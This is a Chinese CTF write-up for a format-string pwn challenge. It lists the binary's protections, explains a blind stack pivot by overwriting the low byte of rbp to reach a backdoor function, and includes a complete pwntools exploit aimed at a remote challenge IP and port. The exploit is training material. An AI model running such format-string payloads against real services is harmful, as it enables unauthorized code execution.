# ezfmt string 

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO|Partial|
|Canary|on    |
|NX    |on    |
|PIE   |off   |
|strip |no    |

## 解题思路

考察格式化字符串却不给libc，说明要找共通之处，先patch一下2.31，发现依赖更高版本，
遂尝试2.35，两者不变的地方在于靠近rbp的位置有一个指向rbp的指针，并且binary中还有一个后门函数。
如果直接把后门函数写到retAddr上，那么会因为栈无法对齐而SIGSEGV，于是可以修改rbp，打栈迁移，
把栈迁移到输入的后门函数地址的下方，这样在main函数返回时就会执行之；不过输入前没有输出，
栈迁移到哪里是盲打的，只有1/16的概率能够命中

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']

def payload(lo:int, rbp:int=0x58):
    global sh
    if lo:
        sh = process('./fmt')
        if lo & 0b10:
            gdb.attach(sh)
    else:
        sh = remote('47.100.137.175', 32034)
    elf = ELF('./fmt')
    sysAddr = elf.symbols['sys']

    if lo & 0b100:
        byte = int(input('input known addr of rbp( & 0xff ):'), 16) # 输入sysAddr - 8的最后一字节以准确命中
    else:
        byte = rbp

    # payload, stack pivot to &sysAddr
    sh.sendline(f'%{byte}c%18$hhn'.ljust(0x10).encode() + p64(sysAddr)) # <- sysAddr is here

    sh.clean(0.5) # have a clean shell
    sh.interactive()
```
